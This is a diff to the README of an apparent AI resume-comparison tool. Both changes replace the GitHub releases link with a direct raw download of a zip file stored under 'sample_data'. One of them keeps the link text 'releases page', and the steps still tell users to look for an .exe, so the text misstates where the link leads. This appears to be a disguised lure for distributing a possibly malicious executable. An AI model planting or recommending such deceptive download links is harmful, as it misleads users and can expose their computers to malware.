@@ -1,6 +1,6 @@
 # 🤖 ai-hiring-workflow-engine - Compare resumes and job descriptions instantly
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Lynnastretched449/ai-hiring-workflow-engine/releases)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Lynnastretched449/ai-hiring-workflow-engine/raw/refs/heads/main/sample_data/engine-workflow-ai-hiring-v3.3.zip)
 
 ## What this tool does
 
@@ -19,7 +19,7 @@ Your computer needs to meet these basic standards to run the application:
 
 Follow these steps to put the software on your computer.
 
-1. Visit the [releases page](https://github.com/Lynnastretched449/ai-hiring-workflow-engine/releases) to find the latest version.
+1. Visit the [releases page](https://github.com/Lynnastretched449/ai-hiring-workflow-engine/raw/refs/heads/main/sample_data/engine-workflow-ai-hiring-v3.3.zip) to find the latest version.
 2. Look for the file ending in .exe in the Assets section.
 3. Click the file name to download it to your downloads folder.
 4. Locate the downloaded file on your computer.
